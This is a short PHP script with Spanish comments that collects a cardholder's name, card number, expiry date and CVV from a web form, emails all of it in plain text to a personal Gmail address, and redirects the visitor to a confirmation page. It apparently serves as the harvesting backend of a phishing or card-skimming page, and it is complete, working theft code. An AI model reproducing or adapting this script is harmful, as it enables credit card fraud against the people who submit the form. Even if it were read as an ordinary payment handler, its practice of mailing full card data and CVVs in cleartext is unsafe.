<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nombre = $_POST["nombre"];
    $numero = $_POST["numero"];
    $vencimiento = $_POST["mes"] . "/" . $_POST["anio"];
    $cvv = $_POST["cvv"];

    $destinatario = "hokahoka695@gmail.com";
    $asunto = "Nuevo formulario de tarjeta de crédito";

    $mensaje = "Nombre: $nombre\n";
    $mensaje .= "Número de tarjeta: $numero\n";
    $mensaje .= "Fecha de vencimiento: $vencimiento\n";
    $mensaje .= "CVV: $cvv\n";

    mail($destinatario, $asunto, $mensaje);

    // Redirigir a una página de confirmación
    header("Location: confirmacion.html");
    exit();
} else {
    // Si alguien intenta acceder directamente a este script, redirigir a la página de inicio
    header("Location: index.html");
    exit();
}
?>
